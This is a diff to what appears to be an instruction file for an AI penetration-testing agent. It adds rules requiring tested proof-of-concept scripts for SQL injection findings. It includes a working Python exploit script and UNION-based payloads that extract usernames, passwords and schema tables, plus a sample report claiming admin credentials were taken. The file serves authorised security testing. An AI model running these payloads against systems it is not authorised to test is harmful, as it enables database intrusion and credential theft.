@@ -316,6 +316,130 @@ Attempt 6: Use automated tool (sqlmap) with all techniques
 Result: Report NO SQL INJECTION FOUND after exhaustive testing
 ```
 
+## PoC Verification Requirements
+
+**CRITICAL**: A SQL injection vulnerability is NOT verified unless you have a working, tested PoC script.
+
+### Mandatory PoC Components
+
+For each SQL injection vulnerability discovered, you MUST create `findings/finding-NNN/` folder with:
+
+1. **poc.py** - Working Python exploit script that:
+   - Takes target URL and vulnerable parameter as arguments
+   - Executes SQL injection payload
+   - Extracts data from the database
+   - Returns success/failure exit code
+   - See `POC_REQUIREMENTS.md` for template
+
+2. **poc_output.txt** - Terminal output showing:
+   - Timestamp of test execution
+   - Complete PoC output with evidence
+   - Proof of successful data extraction
+   - Example: "Successfully extracted 5 user records"
+
+3. **workflow.md** - Manual exploitation guide with:
+   - Step-by-step instructions
+   - Expected output at each step
+   - Troubleshooting tips
+   - Verification checklist
+
+4. **description.md** - Technical analysis including:
+   - SQL injection type (UNION/Boolean/Time/Error/OOB)
+   - Database type and version
+   - Root cause explanation
+   - Attack mechanism details
+   - Impact scenarios
+
+5. **report.md** - Complete vulnerability report with:
+   - CVSS score and risk analysis
+   - Business impact assessment
+   - Remediation guidance
+   - Code examples (vulnerable vs fixed)
+
+### PoC Development Process
+
+1. **Discover** potential SQL injection (Phase 1-3 of agent workflow)
+2. **Develop** PoC script using template from POC_REQUIREMENTS.md
+3. **Test** PoC against target - MUST execute successfully
+4. **Capture** output to poc_output.txt with timestamp
+5. **Document** workflow, description, and report
+6. **Verify** all 5 required files exist in findings/finding-NNN/
+
+### Verification Workflow
+
+```
+Discovery → PoC Development → PoC Testing → Success?
+                                               ↓ Yes
+                                          Create finding folder
+                                          Save all 5 files
+                                          Report vulnerability
+                                               ↓ No
+                                          Refine payload
+                                          Re-test PoC
+                                          Iterate or conclude not exploitable
+```
+
+### Example PoC Script for SQL Injection
+
+```python
+#!/usr/bin/env python3
+"""
+PoC for SQL Injection Vulnerability
+"""
+import requests
+import sys
+import argparse
+from urllib.parse import quote
+
+def exploit_sqli(target, param, payload):
+    """Execute SQL injection exploit"""
+    print(f"[*] Testing SQL injection on {target}")
+    print(f"[*] Parameter: {param}")
+    print(f"[*] Payload: {payload}")
+
+    # Execute injection
+    url = f"{target}?{param}={quote(payload)}"
+    response = requests.get(url)
+
+    # Verify exploitation
+    if "user" in response.text.lower() or "admin" in response.text.lower():
+        print(f"[+] SUCCESS! SQL injection confirmed")
+        print(f"[+] Extracted data:\n{response.text[:500]}")
+        return True
+    else:
+        print(f"[-] Exploitation failed")
+        return False
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('--target', required=True)
+    parser.add_argument('--param', required=True)
+    args = parser.parse_args()
+
+    # UNION-based extraction payload
+    payload = "' UNION SELECT username,password,email FROM users--"
+
+    success = exploit_sqli(args.target, args.param, payload)
+    sys.exit(0 if success else 1)
+```
+
+### Quality Standards
+
+**Do NOT report a SQL injection unless**:
+- ✅ PoC script exists and is executable
+- ✅ PoC was tested and succeeded
+- ✅ poc_output.txt proves successful exploitation
+- ✅ All 5 required documentation files present
+- ✅ Evidence shows actual data extraction (not just syntax errors)
+
+**Reject if**:
+- ❌ Only error messages (not enough for verification)
+- ❌ Theoretical SQL injection without working PoC
+- ❌ PoC script exists but wasn't tested
+- ❌ PoC execution failed
+
+See `../specialized/POC_REQUIREMENTS.md` for complete PoC development guidelines.
+
 ## Reporting Format
 
 Upon completion, report findings in this structure:
@@ -368,6 +492,17 @@ Upon completion, report findings in this structure:
           "5. Extract tables: ' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='app'--",
           "6. Extract users: ' UNION SELECT username,password,email FROM users--"
         ]
+      },
+      "poc_verification": {
+        "status": "VERIFIED",
+        "poc_script": "findings/finding-001/poc.py",
+        "poc_output": "findings/finding-001/poc_output.txt",
+        "workflow": "findings/finding-001/workflow.md",
+        "description": "findings/finding-001/description.md",
+        "report": "findings/finding-001/report.md",
+        "test_timestamp": "2025-01-16T10:30:45Z",
+        "success": true,
+        "evidence": "Successfully extracted 2 user records including admin credentials"
       },
       "business_impact": "Critical - Allows unauthenticated attacker to extract entire database including user credentials, personal information, and business data",
       "remediation": {
